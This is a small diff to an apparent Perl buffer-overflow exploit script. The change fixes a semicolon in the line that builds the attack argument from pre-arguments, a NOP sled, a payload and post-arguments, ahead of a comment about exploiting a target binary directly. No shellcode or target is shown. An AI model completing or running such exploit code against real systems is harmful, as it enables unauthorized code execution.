@@ -99,7 +99,7 @@ if ($uid) {
 # Construct our payload
 my $args    =   $pre_args
             .   "\x90"x($nop_size)
-            .   $payload;
+            .   $payload
             .   $post_args;
 
 # If we are given a path to the binary, attempt to directly exploit it.
